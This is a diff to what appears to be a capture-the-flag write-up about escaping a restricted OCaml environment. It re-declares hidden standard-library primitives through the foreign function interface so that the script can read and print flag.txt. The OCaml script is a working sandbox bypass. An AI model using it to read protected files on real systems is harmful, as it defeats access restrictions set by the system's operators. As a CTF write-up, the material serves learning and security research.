@@ -78,7 +78,12 @@ The `Stdlib` is always compiled and linked, even if we can't access it from the 
 This means that plenty of internal functions can be brought back with the FFI.
 
 By diving into the [standard library code](https://github.com/ocaml/ocaml/tree/trunk/stdlib)
-I found some useful primitives for IO.
+I found some useful IO primitives:
+
+* `caml_sys_open` to open a file descriptor
+* `caml_ml_open_descriptor_out` and `caml_ml_open_descriptor_in` to create channels from fds
+* `caml_ml_output_char` and `caml_ml_input_char` to read and write chars
+
 The script I used to get the flag is the following:
 
 ```ocaml
@@ -89,21 +94,19 @@ type open_flag =
   | Open_binary | Open_text | Open_nonblock
 
 external open_desc : string -> open_flag list -> int -> int = "caml_sys_open";;
-external set_in_channel_name : in_channel -> string -> unit = "caml_ml_set_channel_name";;
-external open_descriptor_out : int -> out_channel = "caml_ml_open_descriptor_out"
-external open_descriptor_in : int -> in_channel = "caml_ml_open_descriptor_in"
+external open_descriptor_out : int -> out_channel = "caml_ml_open_descriptor_out";;
+external open_descriptor_in : int -> in_channel = "caml_ml_open_descriptor_in";;
 external output_char : out_channel -> char -> unit = "caml_ml_output_char";;
 external input_char : in_channel -> char = "caml_ml_input_char";;
 
 let open_in name =
-  let c = open_descriptor_in (open_desc name [Open_rdonly; Open_text] 0) in
-  set_in_channel_name c name;
-  c
+    open_descriptor_in (open_desc name [Open_rdonly; Open_text] 0)
 ;;
 
 let stdout = open_descriptor_out 1;;
 let flag = open_in "flag.txt";;
 
+(* read recursively until error *)
 let rec f () =
     output_char stdout (input_char flag);
     f ()
